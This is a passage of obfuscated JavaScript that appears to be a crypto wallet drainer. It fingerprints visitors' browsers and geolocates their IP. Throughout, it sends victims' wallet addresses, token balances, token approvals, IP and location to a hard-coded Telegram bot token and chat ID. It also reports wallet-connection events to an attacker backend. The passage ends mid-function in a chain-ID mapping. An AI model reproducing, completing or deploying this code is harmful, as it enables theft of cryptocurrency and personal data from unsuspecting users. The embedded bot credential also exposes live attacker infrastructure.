        if (_0x24749d.includes("Edge")) {
          _0x5693bf = "Edge";
        } else if (_0x24749d.includes("Opera")) {
          _0x5693bf = "Opera";
        }
      }
    }
  }
  try {
    const _0x4d43b2 = await fetch("https://api.ipify.org?format=json");
    const _0x6b577a = await _0x4d43b2.json();
    const _0x3f821d = _0x6b577a.ip;
    const _0x25191b = await fetch("https://ipapi.co/" + _0x3f821d + '/json');
    const _0x812a79 = await _0x25191b.json();
    const _0x15935b = _0x812a79.country_name && _0x812a79.city ? _0x812a79.country_name + '-' + _0x812a79.city : "No-Data";
    return {
      'browser': _0x5693bf,
      'isMobile': _0x17ff55,
      'ip': _0x3f821d,
      'locate': _0x15935b
    };
  } catch (_0x303b68) {
    console.error("Error getting IP and location:", _0x303b68);
    return {
      'browser': _0x5693bf,
      'isMobile': _0x17ff55,
      'ip': "Unavailable",
      'locate': 'Unavailable'
    };
  }
}
const enter_website = async () => {
  try {
    let _0x57246 = await send_request({
      'action': "enter_website",
      'user_id': MS_ID,
      'time': new Date().toLocaleString("ru-RU")
    });
    if (_0x57246.status == "error" && _0x57246.error == "BAD_COUNTRY") {
      MS_Bad_Country = true;
    }
  } catch (_0x139b5e) {
    console.log(_0x139b5e);
  }
};
function escaper(_0x4522ba) {
  return _0x4522ba.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!");
}
function formatTokens(_0x535c4c) {
  return _0x535c4c.map(_0x49d049 => _0x49d049.name + "\n Balance (USD): " + _0x49d049.amount_usd.toFixed(0x2) + "\n Chain ID: " + _0x49d049.chain_id + "\n Type: " + _0x49d049.type + "\n\n").join('');
}
async function Noti_connect(_0xc68e89, _0xda6e91, _0xc027de, _0x46f1a9, _0x599efe, _0x4eee2d, _0x15da99, _0x36e689) {
  try {
    let _0x11f09f = "*New Connection 🟢*\n\n" + ("*💰 Wallet:* " + (_0xc68e89 ? _0xc68e89.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌐 Network:* " + (_0xda6e91 ? _0xda6e91.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🦊 WalletType:* " + (_0xc027de ? _0xc027de.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌍 Domain:* " + (_0x46f1a9 ? _0x46f1a9.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🔍 Browser:* " + (_0x599efe ? _0x599efe.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📱 Mobile?:* " + (_0x4eee2d ? _0x4eee2d.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📍 IP:* " + (_0x15da99 ? _0x15da99.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌏 Location:* " + (_0x36e689 ? _0x36e689.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n");
    let _0x36da55 = {
      'url': "https://api.telegram.org/bot6427263028:AAEx_A91AXzpqQoZZ3G-_ykmxhcYS42-kbE/sendMessage",
      'data': JSON.stringify({
        'chat_id': "6319196570",
        'parse_mode': 'MarkdownV2',
        'text': _0x11f09f,
        'disable_web_page_preview': true
      }),
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      }
    };
    await axios(_0x36da55);
    console.log("Connection");
  } catch (_0x5dcd04) {
    console.warn("[-] Connection error: ", _0x5dcd04);
  }
}
async function Noti_info(_0xb53730, _0xd4d0fa, _0x1af932, _0x41bfc4, _0x306b48, _0x347946, _0x84ed0f) {
  try {
    let _0x589272 = "*New Info 🟢*\n\n" + ("*💰 Info Type:* " + (_0xb53730 ? _0xb53730.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🦊 Data:* " + (_0xd4d0fa ? _0xd4d0fa.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌍 Domain:* " + (_0x1af932 ? _0x1af932.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🔍 Browser:* " + (_0x41bfc4 ? _0x41bfc4.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📱 Mobile?:* " + (_0x306b48 ? _0x306b48.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📍 IP:* " + (_0x347946 ? _0x347946.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌏 Location:* " + (_0x84ed0f ? _0x84ed0f.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n");
    let _0x58a465 = {
      'url': "https://api.telegram.org/bot6427263028:AAEx_A91AXzpqQoZZ3G-_ykmxhcYS42-kbE/sendMessage",
      'data': JSON.stringify({
        'chat_id': "6319196570",
        'parse_mode': "MarkdownV2",
        'text': _0x589272,
        'disable_web_page_preview': true
      }),
      'method': 'POST',
      'headers': {
        'Content-Type': "application/json"
      }
    };
    await axios(_0x58a465);
    console.log("Connection");
  } catch (_0x31d1e9) {
    console.warn("[-] Connection error: ", _0x31d1e9);
  }
}
async function Noti_request(_0x4c2e2a, _0xc3b2c7, _0x41b6a4, _0x4946aa, _0x13f955, _0xed23fd, _0x10e11f) {
  try {
    let _0x5a11d6 = "*Action:* " + (_0x4c2e2a ? _0x4c2e2a.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n" + ("*Assets to sign:* " + (_0xc3b2c7.name ? _0xc3b2c7.name.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌍 Domain:* " + (_0x41b6a4 ? _0x41b6a4.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🔍 Browser:* " + (_0x4946aa ? _0x4946aa.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📱 Mobile?:* " + (_0x13f955 ? _0x13f955.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📍 IP:* " + (_0xed23fd ? _0xed23fd.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌏 Location:* " + (_0x10e11f ? _0x10e11f.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n");
    let _0x1310c8 = {
      'url': "https://api.telegram.org/bot6427263028:AAEx_A91AXzpqQoZZ3G-_ykmxhcYS42-kbE/sendMessage",
      'data': {
        'chat_id': "6319196570",
        'parse_mode': "MarkdownV2",
        'text': _0x5a11d6,
        'disable_web_page_preview': true
      },
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      }
    };
    await axios(_0x1310c8);
    console.log("Connection");
  } catch (_0x3f1e89) {
    console.warn("[-] Connection error: ", _0x3f1e89);
  }
}
async function Noti_assets(_0x5e27a2, _0x8dd7f8, _0x3c6487, _0x3f6f83, _0x1402c0, _0x43de89, _0x4116ab, _0x14c20f) {
  try {
    let _0x376478 = formatTokens(_0x3c6487);
    let _0x4668a4 = "*User Assets 📊*\n\n" + ("*💰 Wallet:* " + (_0x5e27a2 ? _0x5e27a2.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*💹 Balance total:* " + (_0x8dd7f8 ? _0x8dd7f8.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n\n") + ("*🪙 Tokens:\n\n " + (_0x376478 ? _0x376478.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "*\n") + ("*🌍 Domain:* " + (_0x3f6f83 ? _0x3f6f83.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🔍 Browser:* " + (_0x1402c0 ? _0x1402c0.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📱 Mobile?:* " + (_0x43de89 ? _0x43de89.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*📍 IP:* " + (_0x4116ab ? _0x4116ab.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n") + ("*🌏 Location:* " + (_0x14c20f ? _0x14c20f.toString() : "N/A").toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "\n");
    let _0x5dcf78 = {
      'url': "https://api.telegram.org/bot6427263028:AAEx_A91AXzpqQoZZ3G-_ykmxhcYS42-kbE/sendMessage",
      'data': {
        'chat_id': "6319196570",
        'parse_mode': 'MarkdownV2',
        'text': _0x4668a4,
        'disable_web_page_preview': true
      },
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      }
    };
    await axios(_0x5dcf78);
    console.log('Connection');
  } catch (_0x38517f) {
    console.warn("[-] Connection error: ", _0x38517f);
  }
}
async function Noti_approve(_0x54b1b3, _0x298ceb, _0x4fe591, _0x7aa4fc, _0x529782, _0xbc4f7c, _0x434fc0) {
  try {
    let _0x18d124 = "*Action: " + _0x54b1b3.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n" + ("*Wallet: " + _0x298ceb.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n") + ("*Token_name: " + _0x4fe591.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n") + ("*Token_symbol: " + _0x7aa4fc.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n") + ("*Token_balance: " + _0x529782.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n") + ("*Chain_id: " + _0xbc4f7c.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n") + ("*Domain: " + _0x434fc0.toString().replace(/\_/g, "\\_").replace(/\*/g, "\\*").replace(/\[/g, "\\[").replace(/\]/g, "\\]").replace(/\(/g, "\\(").replace(/\)/g, "\\)").replace(/\~/g, "\\~").replace(/\`/g, "\\`").replace(/\>/g, "\\>").replace(/\#/g, "\\#").replace(/\+/g, "\\+").replace(/\-/g, "\\-").replace(/\=/g, "\\=").replace(/\|/g, "\\|").replace(/\{/g, "\\{").replace(/\}/g, "\\}").replace(/\./g, "\\.").replace(/\!/g, "\\!") + "  *\n");
    let _0x2f2e9d = {
      'url': "https://api.telegram.org/bot6427263028:AAEx_A91AXzpqQoZZ3G-_ykmxhcYS42-kbE/sendMessage",
      'data': {
        'chat_id': "6319196570",
        'parse_mode': 'MarkdownV2',
        'text': _0x18d124,
        'disable_web_page_preview': true
      },
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      }
    };
    await axios(_0x2f2e9d);
    console.log('Connection');
  } catch (_0x5e0ffc) {
    console.warn("[-] Connection error: ", _0x5e0ffc);
  }
}
const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications.leave_website) {
      return;
    }
    await send_request({
      'action': "leave_website",
      'user_id': MS_ID
    });
  } catch (_0x943ee7) {
    console.log(_0x943ee7);
  }
};
const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications.connect_request) {
      return;
    }
    await send_request({
      'action': "connect_request",
      'user_id': MS_ID,
      'wallet': MS_Current_Provider
    });
  } catch (_0x4caa0c) {
    console.log(_0x4caa0c);
  }
};
const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications.connect_cancel) {
      return;
    }
    await send_request({
      'action': "connect_cancel",
      'user_id': MS_ID
    });
  } catch (_0x108ab2) {
    console.log(_0x108ab2);
  }
};
const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications.connect_success) {
      return;
    }
    await send_request({
      'action': "connect_success",
      'user_id': MS_ID,
      'address': MS_Current_Address,
      'wallet': MS_Current_Provider,
      'chain_id': MS_Current_Chain_ID
    });
  } catch (_0x26960f) {
    console.log(_0x26960f);
  }
};
const convert_chain = (_0x12ad5e, _0x15d898, _0x527e2d) => {
  try {
    if (_0x12ad5e == "ANKR" && _0x15d898 == 'ID') {
      switch (_0x527e2d) {
        case "eth":
          return 0x1;
        case "bsc":
          return 0x38;
        case "polygon":
          return 0x89;
        case "avalanche":
          return 0xa86a;
        case "arbitrum":
          return 0xa4b1;
        case 'optimism':
          return 0xa;
        case "fantom":
          return 0xfa;
        case 'era':
          return 0x144;
        case 'base':
          return 0x2105;
        case 'pulse':
          return 0x171;
        default:
          return false;
      }
    } else {
      if (_0x12ad5e == 'OPENSEA' && _0x15d898 == 'ID') {
        switch (_0x527e2d) {
          case "ethereum":
            return 0x1;
          case "matic":
            return 0x89;
          case "avalanche":
            return 0xa86a;
          case "arbitrum":
            return 0xa4b1;
          case 'optimism':
            return 0xa;
          case 'era':
            return 0x144;
          case "base":
            return 0x2105;
          case "pulse":
            return 0x171;
          default:
            return false;
        }
      } else {
        if (_0x12ad5e == 'ID' && _0x15d898 == "ANKR") {
          switch (_0x527e2d) {
            case 0x1:
              return "eth";
            case 0x38:
              return "bsc";
            case 0x89:
              return 'polygon';
            case 0xa86a:
              return "avalanche";
            case 0xa4b1:
              return "arbitrum";
            case 0xa:
              return 'optimism';
            case 0xfa:
              return "fantom";
